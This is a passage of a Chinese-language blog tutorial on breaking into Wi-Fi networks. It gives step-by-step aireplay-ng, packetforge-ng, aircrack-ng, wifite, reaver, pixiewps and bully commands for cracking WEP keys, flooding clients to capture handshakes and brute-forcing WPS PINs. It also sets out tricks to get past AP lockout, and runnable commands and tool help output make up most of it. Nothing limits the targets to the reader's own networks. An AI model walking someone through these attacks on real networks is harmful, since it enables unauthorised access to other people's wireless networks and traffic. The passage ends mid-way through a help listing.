+<h6 id="4-chopchop攻击模式，用来获得一个包含密钥数据的xor文件"><a href="#4-chopchop攻击模式，用来获得一个包含密钥数据的xor文件" class="headerlink" title="-4 chopchop攻击模式，用来获得一个包含密钥数据的xor文件"></a>-4 chopchop攻击模式，用来获得一个包含密钥数据的xor文件</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -3 -b &lt;AP MAC&gt; -h &lt;Source MAC&gt; &lt;interface name&gt;</span><br><span class="line">aireplay-ng -4 -b ap-mac -h my_mac wifi0</span><br></pre></td></tr></table></figure>
+<p>参数说明：<br>    -h 合法客户端/ 攻击者MAC<br>    aireplay-ng data 字段<br>    64bit密钥：25W<br>    128bit密钥：150W</p>
+<h6 id="5-fragment-碎片包攻击模式，用来获得PRGA（包含密钥的后缀为xor的文件）"><a href="#5-fragment-碎片包攻击模式，用来获得PRGA（包含密钥的后缀为xor的文件）" class="headerlink" title="-5 fragment 碎片包攻击模式，用来获得PRGA（包含密钥的后缀为xor的文件）"></a>-5 fragment 碎片包攻击模式，用来获得PRGA（包含密钥的后缀为xor的文件）</h6><p><code>aireplay-ng -5 -b ap_mac -h my_mac wifi0</code><br>packetforge-ng 数据包制造程序</p>
+<p><code>packetforge-ng -0 -a ap_mac -h my_mac wifi0 -k 255.255.255.255 -l255.255.255.255 -y niam_xor -w mrarp</code><br>参数说明：<br>-0：伪装arp数据包；<br>-k：设置目标文件ip和端口；<br>-l：设置源文件IP和端口；<br>-y：从xor文件中读取PRGA；<br>name：xor文件的名字；<br>-w设置伪装的arp包的文件名</p>
+<p><code>aircrack-ng -n 64 -b ap_mac name-01.ivs</code><br>参数说明：<br>-n设置key长度（64/128/256/512）</p>
+<h4 id="Kismet"><a href="#Kismet" class="headerlink" title="Kismet"></a>Kismet</h4><h5 id="参数说明-2"><a href="#参数说明-2" class="headerlink" title="参数说明"></a>参数说明</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&gt; Executing “kismet -h”</span><br><span class="line">usage: kismet [OPTION]</span><br><span class="line">Nearly all of these options are run-time overrides for values in the kismet.conf configuration file.  //几乎所有这些选项都是kismet.conf配置文件中值的运行时替代。</span><br><span class="line">Permanent changes should be made to.the configuration file. //应该对配置文件进行永久更改</span><br><span class="line"> *** Generic Options ***</span><br><span class="line"> -v, --version                Show version</span><br><span class="line">     --no-console-wrapper     Disable server console wrapper //禁用服务器控制台包装器</span><br><span class="line">     --no-ncurses-wrapper     Disable server console wrapper//禁用服务器控制台包装器</span><br><span class="line">     --debug                  Disable the console wrapper and the crash//禁用控制台包装和崩溃</span><br><span class="line">                              handling functions, for debugging//处理函数，用于调试</span><br><span class="line"> -f, --config-file &lt;file&gt;     Use alternate configuration file//使用备用配置文件</span><br><span class="line">     --no-line-wrap           Turn of linewrapping of output//使用备用配置文件</span><br><span class="line">                              (for grep, speed, etc)</span><br><span class="line"> -s, --silent                 Turn off stdout output after setup phase//使用备用配置文件</span><br><span class="line">     --daemonize              Spawn detached in the background//后面的卒子脱离了</span><br><span class="line">     --no-plugins             Do not load plugins//不要加载插件</span><br><span class="line">     --homedir &lt;path&gt;         Use an alternate path as the home //使用替代路径作为主路径</span><br><span class="line">                               directory instead of the user entry//目录而不是用户条目</span><br><span class="line">     --confdir &lt;path&gt;         Use an alternate path as the base //使用替代路径作为基准</span><br><span class="line">                               config directory instead of the default //目录而不是默认目录</span><br><span class="line">                               set at compile time//在编译时设置</span><br><span class="line">     --datadir &lt;path&gt;         Use an alternate path as the data//使用替代路径作为数据</span><br><span class="line">                               directory instead of the default set at //目录而不是默认设置为</span><br><span class="line">                               compile time.//编译时间。</span><br><span class="line"> *** Logging Options ***</span><br><span class="line"> -T, --log-types &lt;types&gt;      Override activated log types//重写激活的日志类型</span><br><span class="line"> -t, --log-title &lt;title&gt;      Override default log title//重写默认日志标题</span><br><span class="line"> -p, --log-prefix &lt;prefix&gt;    Directory to store log files//存储日志文件的目录</span><br><span class="line"> -n, --no-logging             Disable logging entirely//完全禁用日志记录</span><br><span class="line"></span><br><span class="line"> *** Device Tracking Options ***</span><br><span class="line">     --device-timeout=n       Expire devices after N seconds //N 秒后终止设备</span><br></pre></td></tr></table></figure>
+<h5 id="使用说明-1"><a href="#使用说明-1" class="headerlink" title="使用说明"></a>使用说明</h5><h6 id="1、初始化"><a href="#1、初始化" class="headerlink" title="1、初始化"></a>1、初始化</h6><p><img data-src="https://img-blog.csdnimg.cn/20200323221327242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NjM3Mjc4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200323221720615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NjM3Mjc4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200323221839490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NjM3Mjc4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200323221857943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NjM3Mjc4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200323221916582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NjM3Mjc4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200323221943381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NjM3Mjc4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200323222014995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NjM3Mjc4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img data-src="https://img-blog.csdnimg.cn/20200323222205273.png" alt="在这里插入图片描述"></p>
+<h6 id="2、过程说明"><a href="#2、过程说明" class="headerlink" title="2、过程说明"></a>2、过程说明</h6><ol>
+<li><p>无线网卡开启监听模式<br><code>airmon-ng  start wlan0</code>   网卡改变为监听状态，改名未wlan0mon<br>ps: wlan0 是我的笔记本无线网卡<br>查看自己的笔记本无线网卡是哪个的方法：<br>iwconfig：查看当前未监听状态以及监听状态的网卡名称。</p>
+</li>
+<li><p>修改默认配置文件（/etc/kismet/kismet.conf）</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># See the README for more information how to define sources; sources take the</span><br><span class="line"># form of:</span><br><span class="line"># source=interface:options</span><br><span class="line">#</span><br><span class="line"># For example to capture from a Wi-Fi interface in Linux you could specify:</span><br><span class="line"> source=wlan0mon</span><br><span class="line">#</span><br><span class="line"># or to specify a custom name,</span><br><span class="line"># source=ath9k</span><br><span class="line">#</span><br><span class="line"># Sources may be defined in the config file or on the command line via the </span><br><span class="line"># &apos;-c&apos; option.  Sources may also be defined live via the WebUI.</span><br><span class="line">#</span><br><span class="line"># Kismet does not pre-define any sources, permanent sources can be added here</span><br><span class="line"># or in kismet_site.conf</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>启动<br>sudo kismet<br>浏览器访问<br>然后就能看到嗅探到的信息了。</li>
+</ol>
+<p>通过 Kismet -s，不在输出终端下输出相关嗅探的ap信息。<br>默认嗅探到的信息都保存在当前执行命令的环境下目录下，后缀为kismet。</p>
+<h6 id="3、捕获的信息查阅"><a href="#3、捕获的信息查阅" class="headerlink" title="3、捕获的信息查阅"></a>3、捕获的信息查阅</h6><ol>
+<li>有些WLAN从安全方面考虑，隐藏了SSID或屏蔽SSID广播，这样做的话的确能够防止使用Netstumbler来扫描，但碰上Kismet就毫无办法了，在上图显示的绿色SSID均为被Kismet探测发现的隐藏SSID。我们点击第一个进入，可以看到下图所示详细信息。Name为发现的SSID名称，SSID：（Cloaked）为该SSID为隐藏。</li>
+<li>当Kismet开始运行时，它将会显示这个区域内它找到的所有的无线局域网，“Name”那一列中所显示出来的内容就是AP的SSID，CH列显示频道，点击任意SSID可以看到BSSID（AP 的MAC地址），加密类型（无），设备厂家（cisco）信息。最下方是接入该AP的终端MAC，类型，使用频率（2.467GHz），网卡型号等信息。甚至当目标计算机已关闭时，Kismet也正可从我们的目标AP中检测到数据包，这是因为目标AP在不停地发出“beacons”。</li>
+<li>在获知AP的上述信息后，再利用Airecrack等工具，就能实施破解，</li>
+</ol>
+<h4 id="wifite"><a href="#wifite" class="headerlink" title="wifite"></a>wifite</h4><p>相对于 Aircrack-ng 的使用更加容易，相当于吧 Aircrack-ng 的操作过程集成在一步完成。</p>
+<ol>
+<li>启动wifite。<br>直接输入 wifite<br>启动即扫描</li>
+<li>等待扫描出你需要破解的wifi<br><img data-src="https://img-blog.csdnimg.cn/20200324113149498.png" alt="在这里插入图片描述"><br>CH：是指wifi的信道，这个请自行百度，新一代路由器都会自动分配最佳信道。<br>ENCR：是路由器的加密方式，有一种是WEP加密方式很好破解；<br>POWER：是无线信号强度；<br>WPS：是路由上的WPS开关是否开启，通常是纯数字，也开启的也很好破解；<br>CLIENT：是指监听到有多少客户端连接到路由，仅供参考。<br>BSSID代表路由器的 MAC 地址<br>AUTH 代表认证的方式<br>ESSID是WIFI的名字</li>
+<li>ctrl+c 停止扫描<br>按照提示输入你的目标 wifi num数<br><img data-src="https://img-blog.csdnimg.cn/20200324115909812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NjM3Mjc4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
+<li>然后开始进行扫描客户端，然后开始执行洪水攻击，监听流量抓包，抓到握手的包之后开始进行离线暴力破解。</li>
+<li>暴力破解前自行决定是否更换密码字典。<br> wifite 的默认密码字典是 /usr/share/dict/wordlist-probable.txt<br> 字典内容格式是一行一个密码<br> 你可以选择网络搜集别人分享的密码字典，或者根据社会工程学利用crunch来生成对应的密码字典。</li>
+<li>破解时间比较长，我用老电脑跑8位全数字密码字典大概5个多小时。后面研究下用GPU跑字典，时间  是不是短点。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] 1 attack completed:</span><br><span class="line">[+] 1/1 WEP attacks succeeded</span><br><span class="line">       cracked Test (14:E6:E4:AC:FB:20), key: &quot;6162636465&quot;</span><br><span class="line">[+] disabling monitor mode on mon0… done</span><br><span class="line">[+] quitting</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>从以上输出信息中，可以看到解密成功。其中，Test无线接入点的密码是6162636465。</p>
+<h4 id="pixiewps"><a href="#pixiewps" class="headerlink" title="pixiewps"></a>pixiewps</h4><h5 id="参数说明-3"><a href="#参数说明-3" class="headerlink" title="参数说明"></a>参数说明</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&gt; Executing “pixiewps -h”</span><br><span class="line"> Pixiewps 1.4 WPS pixie-dust attack tool</span><br><span class="line"> Copyright (c) 2015-2017, wiire &lt;wi7ire@gmail.com&gt;</span><br><span class="line"> Usage: pixiewps &lt;arguments&gt;</span><br><span class="line"> Required arguments: //必要参数</span><br><span class="line">   -e, --pke         : Enrollee public key  //注册会员公开密码匙</span><br><span class="line">   -r, --pkr         : Registrar public key //注册主任公开密码匙</span><br><span class="line">   -s, --e-hash1     : Enrollee hash-1 // 加入者hash值</span><br><span class="line">   -z, --e-hash2     : Enrollee hash-2</span><br><span class="line">   -a, --authkey     : Authentication session key //认证会话密钥</span><br><span class="line">   -n, --e-nonce     : Enrollee nonce //新登记</span><br><span class="line"> Optional arguments://可选参数:</span><br><span class="line">   -m, --r-nonce     : Registrar nonce//注册主任</span><br><span class="line">   -b, --e-bssid     : Enrollee BSSID</span><br><span class="line">   -v, --verbosity   : Verbosity level 1-3, 1 is quietest           [3] //详细程度1-3级，1级最安静</span><br><span class="line">   -o, --output      : Write output to file //将输出写入文件</span><br><span class="line">   -j, --jobs        : Number of parallel threads to use         [Auto] //使用的线程数</span><br><span class="line"></span><br><span class="line">   -h                : Display this usage screen //显示此用法帮助界面</span><br><span class="line">   --help            : Verbose help and more usage examples//详细帮助和更多的使用示例</span><br><span class="line">   -V, --version     : Display version//显示版本</span><br><span class="line"></span><br><span class="line">   --mode N[,... N]  : Mode selection, comma separated           [Auto] //模式选择，逗号分隔</span><br><span class="line">   --start [mm/]yyyy : Starting date             (only mode 3) [+1 day] //开始日期</span><br><span class="line">   --end   [mm/]yyyy : Ending date               (only mode 3) [-1 day] //结束日期</span><br><span class="line">   -f, --force       : Bruteforce full range     (only mode 3) //野兽力全射程</span><br><span class="line"> Miscellaneous arguments:  //其他参数:</span><br><span class="line">   -7, --m7-enc      : Recover encrypted settings from M7 (only mode 3)  //从 M7恢复加密设置</span><br><span class="line">   -5, --m5-enc      : Recover secret nonce from M5       (only mode 3)  //从 M5中恢复秘密</span><br><span class="line"></span><br><span class="line"> Example (use --help for more):</span><br><span class="line"> pixiewps -e &lt;pke&gt; -r &lt;pkr&gt; -s &lt;e-hash1&gt; -z &lt;e-hash2&gt; -a &lt;authkey&gt; -n &lt;e-nonce&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">--help example</span><br><span class="line"> Pixiewps 1.4 WPS pixie-dust attack tool</span><br><span class="line"> Copyright (c) 2015-2017, wiire &lt;wi7ire@gmail.com&gt;</span><br><span class="line"></span><br><span class="line"> Description of arguments:</span><br><span class="line"></span><br><span class="line"> -e, --pke</span><br><span class="line"></span><br><span class="line">     Enrollee&apos;s DH public key, found in M1.</span><br><span class="line"></span><br><span class="line"> -r, --pkr</span><br><span class="line"></span><br><span class="line">     Registrar&apos;s DH public key, found in M2.</span><br><span class="line"></span><br><span class="line"> -s, --e-hash1</span><br><span class="line"></span><br><span class="line">     Enrollee hash-1, found in M3. It&apos;s the hash of the first half of the PIN.</span><br><span class="line"></span><br><span class="line"> -z, --e-hash2</span><br><span class="line"></span><br><span class="line">     Enrollee hash-2, found in M3. It&apos;s the hash of the second half of the PIN.</span><br><span class="line"></span><br><span class="line"> -a, --authkey</span><br><span class="line"></span><br><span class="line">     Authentication session key. Although for this parameter a modified version of Reaver or Bully is needed, it can be avoided by specifying small Diffie-Hellman keys in both Reaver and Pixiewps and supplying --e-nonce, --r-nonce and --e-bssid.</span><br><span class="line"></span><br><span class="line"> [?] pixiewps -e &lt;pke&gt; -s &lt;e-hash1&gt; -z &lt;e-hash2&gt; -S -n &lt;e-nonce&gt; -m &lt;r-nonce&gt; -b &lt;e-bssid&gt;</span><br><span class="line"></span><br><span class="line"> -n, --e-nonce</span><br><span class="line"></span><br><span class="line">     Enrollee&apos;s nonce, found in M1.</span><br><span class="line"></span><br><span class="line"> -m, --r-nonce</span><br><span class="line"></span><br><span class="line">     Registrar&apos;s nonce, found in M2. Used with other parameters to compute the session keys.</span><br><span class="line"></span><br><span class="line"> -b, --e-bssid</span><br><span class="line"></span><br><span class="line">     Enrollee&apos;s BSSID. Used with other parameters to compute the session keys.</span><br><span class="line"></span><br><span class="line"> -S, --dh-small (deprecated)</span><br><span class="line"></span><br><span class="line">     Small Diffie-Hellman keys. The same option must be specified in Reaver too. Some Access Points seem to be buggy and don&apos;t behave correctly with this option. Avoid using it with Reaver when possible</span><br><span class="line"></span><br><span class="line"> --mode N[,... N]</span><br><span class="line"></span><br><span class="line">     Select modes, comma separated (experimental modes are not used unless specified):</span><br><span class="line"></span><br><span class="line">         1 (RT/MT/CL)</span><br><span class="line">         2 (eCos simple)</span><br><span class="line">         3 (RTL819x)</span><br><span class="line">         4 (eCos simplest) [Experimental]</span><br><span class="line">         5 (eCos Knuth)    [Experimental]</span><br><span class="line"></span><br><span class="line"> --start [mm/]yyyy</span><br><span class="line"> --end   [mm/]yyyy</span><br><span class="line"></span><br><span class="line">     Starting and ending dates for mode 3. They are interchangeable. If only one is specified, the current time will be used for the other. The earliest possible date is 01/1970, corresponding to 0 (Unix epoch time), the latest is 02/2038, corresponding to 0x7FFFFFFF. If --force is used then pixiewps will start from the current time and go back all the way to 0.</span><br><span class="line"></span><br><span class="line"> -7, --m7-enc</span><br><span class="line"></span><br><span class="line">     Encrypted settings, found in M7. Recover Enrollee&apos;s WPA-PSK and secret nonce 2. This feature only works on some Access Points vulnerable to mode 3.</span><br><span class="line"></span><br><span class="line"> [?] pixiewps -e &lt;pke&gt; -r &lt;pkr&gt; -n &lt;e-nonce&gt; -m &lt;r-nonce&gt; -b &lt;e-bssid&gt; -7 &lt;enc7&gt; --mode 3</span><br><span class="line"></span><br><span class="line"> -5, --m5-enc</span><br><span class="line"></span><br><span class="line">     Encrypted settings, found in M5. Recover Enrollee&apos;s secret nonce 1. This option must be used in conjunction with --m7-enc. If --e-hash1 and --e-hash2 are also specified, pixiewps will also recover the WPS PIN.</span><br><span class="line"></span><br><span class="line"> [?] pixiewps -e &lt;pke&gt; -r &lt;pkr&gt; -n &lt;e-nonce&gt; -m &lt;r-nonce&gt; -b &lt;e-bssid&gt; -7 &lt;enc7&gt; -5 &lt;enc5&gt; --mode 3</span><br><span class="line"> [?] pixiewps -e &lt;pke&gt; -r &lt;pkr&gt; -n &lt;e-nonce&gt; -m &lt;r-nonce&gt; -b &lt;e-bssid&gt; -7 &lt;enc7&gt; -5 &lt;enc5&gt; -s &lt;e-hash1&gt; -z &lt;e-hash2&gt; --mode 3</span><br></pre></td></tr></table></figure>
+<h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>顾名思义，就是针对wps连接的wifi进行攻击，但是现在懂wps连接的又有几个呢，然后又费事的用wps连接的又有几个呢，所以就没大用咯。</p>
+<p>只适用于固定厂商的芯片，成功率很低<br>很多厂家实现了锁定机制，所以爆破时应注意限速<br>一旦触发锁定，可尝试耗尽AP连接数，令其重启并解除WPS锁定</p>
+<p>开源地址：<a href="https://github.com/wiire-a/pixiewps" target="_blank" rel="noopener">https://github.com/wiire-a/pixiewps</a><br>国内镜像：<a href="https://gitee.com/lhc0101/pixiewps" target="_blank" rel="noopener">https://gitee.com/lhc0101/pixiewps</a></p>
+<h5 id="使用说明-2"><a href="#使用说明-2" class="headerlink" title="使用说明"></a>使用说明</h5><p>首先确保你的无线网卡能工作，进入monitor模式<br><code>airmon-ng start wlan0</code></p>
+<p>使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wash -C -i wlan0mon </span><br><span class="line">airodump-ng wlan0mon --wps</span><br></pre></td></tr></table></figure></p>
+<p>来扫描开WPS的AP ctrl+c停止</p>
+<p>使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reaver -i wlan0mon -b &lt;AP mac&gt; -vv </span><br><span class="line">reaver -i wlan0mon -b &lt;AP mac&gt; -vv -K 1</span><br></pre></td></tr></table></figure></p>
+<p>想要攻击的AP’MAC地址 -v  -K 1<br>如果存在该漏洞的话，很快就能出pin和密码了</p>
+<p>得到pin码子：如888888<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reaver -i wlan0mon -b &lt;AP mac&gt; -vv -p 88888888</span><br></pre></td></tr></table></figure></p>
+<p>得到密码</p>
+<p>如果确实有这方面的漏洞，秒破～</p>
+<h4 id="reaver"><a href="#reaver" class="headerlink" title="reaver"></a>reaver</h4><h5 id="参数说明-4"><a href="#参数说明-4" class="headerlink" title="参数说明"></a>参数说明</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-i  无线网卡名称</span><br><span class="line">-b  目标AP的mac地址</span><br><span class="line">-a  自动检测目标AP最佳配置</span><br><span class="line">-S  使用最小的DH key，可以提高破解速度</span><br><span class="line">-vv  显示更多的非严重警告（注意这是 2 个小写字母 v）</span><br><span class="line">-d  即delay每穷举一次的闲置时间 预设为1秒</span><br><span class="line">-c  信道编号</span><br><span class="line">-p  PIN码四位或八位  //可以用8位直接找到密码。</span><br></pre></td></tr></table></figure>
+<h5 id="使用说明-3"><a href="#使用说明-3" class="headerlink" title="使用说明"></a>使用说明</h5><p>同上一个功能</p>
+<ol>
+<li>同上先开启无线网卡监听<br><code>airmon-ng  start  wlan0</code></li>
+<li>然后附近 WLAN 网络<br><code>airodump-ng  wlan0mon</code></li>
+<li>找出开启了 WPS 功能、可以使用 PIN码 登录的路由器，并另外记录下该 AP 的 BSSID（约等于该 AP 的 MAC 地址）：<br><code>wash  -i  wlan0mon</code></li>
+<li>开始进行 PIN码 穷举破解（注意末尾的参数是 2 个小写字母 v）：<br><code>reaver -i wlan0mon -b xx:xx:xx:xx:xx:xx -vv</code><br><code>reaver -i wlan0mon -b D8:15:0D:D6:13:92 -a -S -d9 -t9 -vv</code> -d9 -t9时间间隔，防止挂掉</li>
+<li>等待破解完成，这期间可以查看到穷举破解花费的时间、预计剩余时间、穷举PIN码进度等信息</li>
+<li>破解完成后，查看并记录下 PIN码 和 密码，获取到 PIN码 后，以后即便路由器更换了密码，也可以很迅速地通过 PIN码 重新获得新密码。举例：<br> <code>reaver  -i  wlan0mon -b  xx:xx:xx:xx:xx:xx  -p 12316977</code></li>
+<li>最后，结束无线网卡的监控模式。</li>
+</ol>
+<h4 id="bully"><a href="#bully" class="headerlink" title="bully"></a>bully</h4><p>是 WPS 穷举法的一个新实现，用 c 语言编写。 它在概念上与其他程序相同，因为它利用了 WPS 规范中的(现在众所周知的)设计缺陷。 与原始的 reaver 代码相比，它有几个优点。 其中包括减少依赖项、改进内存和 cpu 性能、正确处理 endianness 以及更健壮的选项集。 它运行在 Linux 上，并且是专门为在嵌入式 Linux 系统(OpenWrt 等)上运行而开发的，无论其体系结构如何。</p>
+<p>开源地址：<a href="https://gitlab.com/kalilinux/packages/bully/" target="_blank" rel="noopener">https://gitlab.com/kalilinux/packages/bully/</a></p>
+<h5 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h5><h5 id="参数说明-5"><a href="#参数说明-5" class="headerlink" title="参数说明"></a>参数说明</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">usage: bully \ interface</span><br><span class="line">Required arguments:</span><br><span class="line">  interface      : Wireless interface in monitor mode (root required)</span><br><span class="line">  -b, --bssid macaddr    : MAC address of the target access point</span><br><span class="line">Or</span><br><span class="line">  -e, --essid string     : Extended SSID for the access point</span><br><span class="line">Optional arguments:</span><br><span class="line">  -c, --channel N[,N...] : Channel number of AP, or list to hop [b/g]</span><br><span class="line">  -i, --index N          : Starting pin index (7 or 8 digits)  [Auto]</span><br><span class="line">  -l, --lockwait N       : Seconds to wait if the AP locks WPS   [43]</span><br><span class="line">  -o, --outfile file     : Output file for messages          [stdout]</span><br><span class="line">  -p, --pin N            : Starting pin number (7 or 8 digits) [Auto]</span><br><span class="line">  -s, --source macaddr   : Source (hardware) MAC address      [Probe]</span><br><span class="line">  -u, --lua              : Lua script file</span><br><span class="line">  -v, --verbosity N      : Verbosity level 1-3, 1 is quietest     [3]</span><br><span class="line">  -w, --workdir path     : Location of pin/session files  [~/.bully/]</span><br><span class="line">  -5, --5ghz             : Hop on 5GHz a/n default channel list  [No]</span><br><span class="line">  -B, --bruteforce       : Bruteforce the WPS pin checksum digit [No]</span><br><span class="line">  -F, --force            : Force continue in spite of warnings   [No]</span><br><span class="line">  -S, --sequential       : Sequential pins (do not randomize)    [No]</span><br><span class="line">  -T, --test             : Test mode (do not inject any packets) [No]</span><br><span class="line">Advanced arguments:</span><br><span class="line">  -d, --pixiewps         : Attempt to use pixiewps               [No]</span><br><span class="line">  -g, --genpin N         : Pin Generator [1] D-Link [2] Belkin    [0]</span><br><span class="line">  -a, --acktime N        : Deprecated/ignored                  [Auto]</span><br><span class="line">  -r, --retries N        : Resend packets N times when not acked  [2]</span><br><span class="line">  -m, --m13time N        : Deprecated/ignored                  [Auto]</span><br><span class="line">  -t, --timeout N        : Deprecated/ignored                  [Auto]</span><br><span class="line">  -1, --pin1delay M[,N]  : Delay M seconds every Nth nack at M5 [0,1]</span><br><span class="line">  -2, --pin2delay M[,N]  : Delay M seconds 